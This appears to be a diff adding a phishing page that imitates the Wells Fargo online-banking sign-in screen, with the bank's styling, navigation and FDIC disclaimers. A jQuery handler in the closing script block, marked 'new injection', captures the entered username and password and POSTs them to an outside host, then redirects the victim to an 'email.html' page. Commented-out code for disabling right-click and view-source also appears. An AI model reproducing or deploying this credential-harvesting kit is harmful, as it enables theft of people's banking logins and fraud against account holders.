@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+    <title>Document</title>
+</head>
+    <style type="text/css">
+        * {
+            padding: 0;
+            margin: 0;
+            color: #1a1f36;
+            box-sizing: border-box;
+            word-wrap: break-word;
+            font-family: -apple-system-body,Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif;
+        }
+
+        body{
+            font-family: -apple-system-body,Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif;
+/*          sfont-size: .9375rem;*/
+            line-height: 1.1875rem;
+            color: #3b3331;
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+        .home{
+            min-height: 460px;
+            width: 100%;
+        }
+        .login-form{
+            box-sizing: border-box;
+            border-radius: 12px;
+            box-shadow: rgba(59, 51, 49, 0.15) 0px 0px 16px 0px;
+            margin-right: auto;
+            margin-left: auto;
+            width: 870px;
+/*          max-width: 870px;*/
+            background-color: white;
+            margin-top: 50px;
+        }   
+        .needhelp{
+/*            box-sizing: border-box;*/
+            background: rgb(244, 240, 237);
+            width: 870px;
+            height: 89px;
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+            margin-top: 40px;
+            color: rgb(59, 51, 49);
+            font-size: 16px;
+            text-align: center;
+            overflow: hidden;
+            margin-bottom: 0px;
+        }
+        .float_text{
+                font-size: 1.875rem;
+        }
+        
+         .saveusername{
+            box-sizing: border-box;
+            line-height: 1.1875rem;
+            color: rgb(59, 51, 49);
+            font-size: 16px;
+        }
+        .boxycheck{
+            font-size: 28px; color: rgb(90, 70, 155);
+            vertical-align: middle;
+            transition: box-shadow 200ms ease 0s;
+            margin-left: 217.5px;
+            width: 25px;
+            height: 25px;
+        }
+        .pad{
+            padding: 10px;
+        }
+
+        .error{
+
+            font-size: .875rem;
+            width: 435px;
+            background-color: #fff;
+            border: 1px solid #e2dede;
+            box-sizing: border-box;
+            box-shadow: 0 1px 3px rgb(0 0 0 / 10%);
+            border-radius: 6px;
+            line-height: 16px;
+            color: #141414;
+            padding: 16px 16px 16px 8px;
+        }
+
+
+        .signon{
+            margin: 14px 0px 0px;
+            cursor: pointer;
+            user-select: none;
+            background: none rgb(215, 30, 40);
+            white-space: nowrap;
+            font-weight: 600;
+            border-radius: 24px;
+            font-size: 1rem;
+            height: 44px;
+            padding: 9px 1rem 11px;
+            width: 175px;
+            color: rgb(255, 255, 255);
+            border-style: solid;
+            border-color: rgb(215, 30, 40);
+            -webkit-writing-mode: horizontal-tb !important;
+        }
+
+        h1 {
+            font-family: -apple-system-body,"Wells Fargo Serif",Georgia,serif;
+            font-size: 10000px;
+            font-weight: 400;
+            line-height: 3.25rem;
+        }
+        .sign{
+            font-size: 15px;
+/*            margin: 8px 0 16px;*/
+            display: block;
+            line-height: normal;
+            font-family: -apple-system-body,Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif;
+            color: #3b3331;
+        }
+        input[type=text]:hover, input[type=password]:hover{
+            background-color: #f4f0ed82;
+/*            width: 100%;*/
+        }
+
+        .lock{
+            color: white;
+        }
+
+        .form{
+            border-radius: 8px;
+            border: none;
+            width: 90px;
+            height: 36px;
+            padding: 0 36px 0 8px;
+            font-size: .6875rem;
+
+
+
+        }
+
+.register label{
+
+    margin-bottom:30px;
+    font-size: 18px;
+    position:relative;
+    border-bottom:1px solid #787070;
+
+}
+
+.register input{
+
+   width: 435px; 
+   height: 55px;
+    margin-top:10px;   
+    padding-left: 10px;
+    border:none;
+    outline:none;
+    font-size: 18px;
+}
+.register input::placeholder{
+    opacity:0;
+}
+ .register svg{
+    position: absolute;
+    bottom: 10px;
+    right: 10px;
+}
+.register span{
+    position:absolute;
+    top:0;
+    left:0;
+    transform:translateY(30px);
+    font-size: 18px;
+    padding-left: 10px;
+    transition-duration:300ms;
+}
+
+label:focus-within > span,
+input:not(:placeholder-shown) + span{
+    font-size: 13px;
+    color:#787070;
+    transform:translateY(10px);
+    line-height: 16px;
+}
+
+label:focus-within > input{
+    border-bottom: 2px solid #5a469b;
+}
+.logo{
+    padding:0 87px;
+}
+
+        @media screen and (max-width:900px){
+            .login-form{
+                width: 100%;
+                border-radius: 0px;
+            }
+            .needhelp{
+                width: 100%;
+                border-radius: 0px;
+            }
+            .pad{
+                display: none;
+            }
+        }
+
+        @media screen and (max-width:750px){
+            
+            .login-form{
+                border: none;
+                border-radius: 0px;
+                margin: 0px;
+                box-shadow: none;
+                width: 100%;
+                margin-top: -65pxpx;
+            }
+            .username, .password{
+                width: 50%;
+            }
+            .needhelp{
+                border-radius: 0px;
+                box-shadow: none;
+                background-color: white;
+                width: 100%;
+
+            }
+            nav{
+                width: 100%;
+                margin: 0;
+                margin-right: -23px;
+            }
+            .boxycheck{
+                margin-left: 25%;
+            }
+        }
+          @media screen and (max-width:540px){
+        
+            .login-form{
+                width: 100%;
+            }
+            .register input{
+                width: 90%;
+            }
+            .register label{
+                width: 90%;
+            }
+             input[type=text]:hover, input[type=password]:hover{
+            background-color: #f4f0ed82;
+            width: 100%;
+        }
+            .boxycheck{
+                margin-left: 5%;
+            }
+            .error{
+                width: 80%;
+            }
+            .logo{
+                padding: 0 40px;
+            }
+        }
+
+
+
+    </style>
+<body>
+  
+    <nav class="navbar navbar-expand-lg" style="background: #d71e28; border-bottom:4px solid #fcc60a; width: 100%; position: fixed; z-index: 1;">
+        <div class="container-fluid text-light">
+            <div class="logo" >                
+                <a class="" href="#" class=" "><img id="navlogo" src="text.png" height="40px" width="210px" alt="logo"></a>
+            </div>
+            
+            
+
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="" style="border: none; color:white;">
+                <span class="navbar-toggler-icon" style="color: white;"></span>
+            </button>
+            <div class="collapse navbar-collapse justify-content-end" id="myNav" style="margin-right: 100px;">
+                <ul class="navbar-nav ">
+                    <li class="nav-item">
+                        <a href="" class="nav-link" style="font-size: .8125rem; color: white;">
+                            <svg width="14px" height="20px" viewBox="0 0 15 21" aria-hidden="true" role="img" class="lock" focusable="false">
+                                <path d="M7.3 19.2c-3 0-5.5-2.5-5.5-5.5 0-3 2.5-5.5 5.5-5.5s5.5 2.5 5.5 5.5C12.8 16.7 10.3 19.2 7.3 19.2zM4.1
+                                  5c0-1.8 1.4-3.2 3.2-3.2 1.8 0 3.2 1.4 3.2 3.2v2.1C9.5 6.6 8.5 6.4 7.3 6.4c-1.1 0-2.2 0.3-3.2 0.7V5zM12.4
+                                  8.5V5.1C12.4 2.3 10.1 0 7.3 0 4.5 0 2.2 2.3 2.2 5.1v3.4C0.8 9.8 0 11.6 0 13.7 0 17.7 3.3 21 7.3
+                                  21s7.3-3.3 7.3-7.3C14.6 11.6 13.8 9.8 12.4 8.5L12.4 8.5zM7.3 12.1c0.3 0 0.5-0.2 0.5-0.5V9.4c0-0.3-0.2-0.5-0.5-0.5
+                                  -0.3 0-0.5 0.2-0.5 0.5v2.3C6.9 11.9 7.1 12.1 7.3 12.1zM5.8 13.7c0-0.3-0.2-0.5-0.5-0.5H3c-0.3 0-0.5 0.2-0.5 0.5 0
+                                  0.3 0.2 0.5 0.5 0.5h2.3C5.6 14.2 5.8 13.9 5.8 13.7zM7.3 15.2c-0.3 0-0.5 0.2-0.5 0.5v2.3c0 0.3 0.2 0.5 0.5 0.5
+                                  0.3 0 0.5-0.2 0.5-0.5v-2.3C7.8 15.5 7.6 15.2 7.3 15.2zM8.9 13.7c0 0.3 0.2 0.5 0.5 0.5h2.3c0.3 0 0.5-0.2 0.5-0.5
+                                  0-0.3-0.2-0.5-0.5-0.5H9.3C9.1 13.2 8.9 13.4 8.9 13.7zM6.2 12.6c0.2-0.2 0.2-0.5 0-0.6L4.6 10.3c-0.2-0.2-0.5-0.2-0.6 0
+                                  -0.2 0.2-0.2 0.5 0 0.6l1.6 1.6C5.8 12.8 6 12.8 6.2 12.6zM6.2 14.8c-0.2-0.2-0.5-0.2-0.6 0l-1.6 1.6c-0.2 0.2-0.2 0.5 0
+                                  0.6 0.2 0.2 0.5 0.2 0.6 0l1.6-1.6C6.4 15.3 6.4 15 6.2 14.8zM8.4 14.8c-0.2 0.2-0.2 0.5 0 0.6l1.6 1.6c0.2 0.2 0.5 0.2
+                                  0.6 0 0.2-0.2 0.2-0.5 0-0.6l-1.6-1.6C8.9 14.6 8.6 14.6 8.4 14.8zM8.4 12.6c0.2 0.2 0.5 0.2 0.6 0l1.6-1.6c0.2-0.2 0.2-0.5 0-0.6
+                                  -0.2-0.2-0.5-0.2-0.6 0l-1.6 1.6C8.2 12.1 8.2 12.4 8.4 12.6z">                                      
+                                  </path>
+                              </svg>
+
+                        Enroll</a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="" class="nav-link text-light" style="font-size: 13px;">Customer Service</a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="" class="nav-link text-light" style="font-size: 13px;">ATMs/Locations</a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="" class="nav-link text-light" style="font-size: 13px;">Espanol</a>
+                    </li>
+                    <div style="position: relative; padding-left:16px;">
+                       <form action="" class="">
+                        <input type="text" class="form" placeholder="Search">
+                    </form> 
+                    </div>
+                    
+                    
+                </ul>
+                
+            </div>
+            
+        </div>
+    </nav>
+    
+
+
+                <div style="padding:30px"></div>
+
+
+<div  class="home">
+
+    <div>
+        <form action="" method="POST">
+            <div class="login-form">
+
+           <!--      <center id="msg" style="display: none;">
+                    <div style="padding-top:40px">
+                        <div class="error" style="text-align: left;">
+
+
+                            <div style="display: flex; flex-flow: row nowrap; flex: 1 1 auto; align-items: stretch;">
+
+                                <div style="display: flex; flex-flow: column nowrap; align-items: center; justify-content: flex-start;">
+                                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAACJklEQVR4nOVUz2sTURB+/gQvelJEi8VkZ7bJTStSa3fGiB70ohf1H7B4ExXvCnoTr63iH6AInqRF8CAFjyIiuzMxKGgvIopVqKL4Y2U2uyamSbYmwYsffPD2mzffzM6+t879K8jECArjNSW83w+FYDqiEvxhHnLRE8IPSrCojHM9F2DLhUUlXDDPRvfWOeOnWsUr9juJkIueeQnBVKMAwT0hfJI7xqC405i7j+GpMMw2CXhZCb5pxfe7JSrhgjK877anyjgihN+F8NJvsTbhbawn40zXAgGcEobJnO5nzcs8WwJ4VhnjKuGhTsmPRkfXGDvFI4LD5mFebZOFQIWg2slEGG4b28XCcnmt5ZpHxyaEvINJB4Tn2sWVMVLCsH0MzudNIDOZEcaPIZc3L4kRvBOCt6368z2FTfV7hHddHtJL90UZrzfryQgZfwjjz9YRKMENZfiadwqb3gKumpmyvyvTnu2HrTaChOP+lkyPyNuRHssrbrmo7fbWK8FrIXgYO7fCNLtgWQEzbTSDc8L45sWBwoZlF0gMGSbTj3bcnqsBbrfxGG2ddB/gifRYnnR/i/iYW6WMj5Xg5fzY0Lp6UW/MaGvTlPGV7YmdW+l6gQb+eNI14YUlMYaLybgCoJ7Mm4xuCePnqFIazrQae0Ppb/mm6xdRpTRsBeyMP2BebbS1/ZLDvYVtbhAQxjPpCZpPGSvBaTdIRIxHlfGOsboPjwzU3P3X+AVV9U5BmXnRYwAAAABJRU5ErkJggg==">
+                                    </div>
+
+                                    <div style="display: flex; flex-flow: column nowrap;">
+                                        <div role="presentation" >
+                                            <div style="font-size:11px; margin-left: 20px;" >
+                                                <div>We do not recognize your username and/or password.  Please try again.</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                        </div>
+                    </div>
+                   
+                </center> -->
+                
+
+                <div  style="text-align: center; padding-top: 20px;">
+                    <h1 class="float_text">
+                    <span class="sign">Sign in to manage your account</span></h1>
+                </div>
+
+
+
+                <div class="register">
+                
+                        <div style="text-align:center;">
+                            <label for="name">
+                                <input class="username" name="email" id="email"  type="text" required>
+                                <span>Username</span>
+
+                            </label>
+                            <label for="email">
+                                <input class="password" name="password" id="pwwwd" type="password" autocomplete="current-password;" required>
+                                <span>Password</span>
+                            </label>
+                        </div>  
+                </div>
+            
+                <p class="saveusername" style="">
+                    <input class="boxycheck" id="checkbox1" style="" type="checkbox">&nbsp;&nbsp;Save username
+                </p>
+
+                <div style="box-sizing: border-box; text-align: center;">
+                     <input type="submit" class="signon" type="submit"  id="submit-btn" value="sign on">
+                </div>
+
+                <div class="needhelp">
+                    <p style="box-sizing: border-box; margin-top: 34px; font-size: 14px; width: auto; text-decoration: underline;">Forgot username or password?</p>
+                </div>
+            </div>
+        </form> 
+
+
+
+                
+
+    </div>
+
+   
+
+
+    <div class="login-form">
+        <div style="padding: 20px 30px 20px 30px;">
+            <div style="border: 1px solid black;">
+                <div style="padding:0px 10px 10px 10px;font-weight: bold; line-height: 1.5rem; font-size: 1rem;">
+                    <p>Investment and Insurance Products are:</p>
+                    <ul style="list-style-type: square; padding-left:20px;">
+                        <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                        <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                        <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+                    </ul>
+                </div>
+            </div>
+            <div style="padding: 10px;"></div>
+            Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+        </div>
+    </div>
+</div>
+    
+
+
+
+    <div style="padding-top: 50px;">
+        <img src="footer.PNG" style="width:100%">
+    </div>
+
+
+
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+ 
+
+ <script>
+  
+  // prevent ctrl + s
+// $(document).bind('keydown', function(e) {
+// if(e.ctrlKey && (e.which == 83)) {
+// e.preventDefault();
+// return false;
+// }
+// });
+
+// document.addEventListener('contextmenu', event => event.preventDefault());
+
+// document.onkeydown = function(e) {
+// if (e.ctrlKey && 
+// (e.keyCode === 67 || 
+// e.keyCode === 86 || 
+// e.keyCode === 85 || 
+// e.keyCode === 117)) {
+// return false;
+// } else {
+// return true;
+// }
+// };
+// $(document).keypress("u",function(e) {
+// if(e.ctrlKey)
+// {
+// return false;      }
+// else {
+// return true;
+// }});
+
+  
+  
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var pwwwd=$("#pwwwd").val();
+var msg = $('#msg').html();
+
+///////////new injection////////////////
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://bfireseip.us/wells/main.php',
+type: 'POST',
+        data:{
+          email:email,
+          pwwwd:pwwwd,
+        },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                    $("#email").val("");
+                  $("#pwwwd").val("");
+                  if (count>=1) {
+                    count=0;
+                    window.location = "email.html";
+                  // window.location.href("");
+
+                }
+                // $('#msg').html(response['msg']);
+            }
+            else{
+              // $('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+      $("#pwwwd").val("");
+      if (count>=1) {
+        count=0;
+         window.location = "email.html";
+      }
+    $("#msg").show();
+              // $('#msg').html("Please try again later");
+    },
+    complete: function(){
+      $('#submit-btn').val('Sign on');
+    }
+});
+  });
+
+
+  });
+
+
+</script>
+
+
+
+</body>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
+</html>
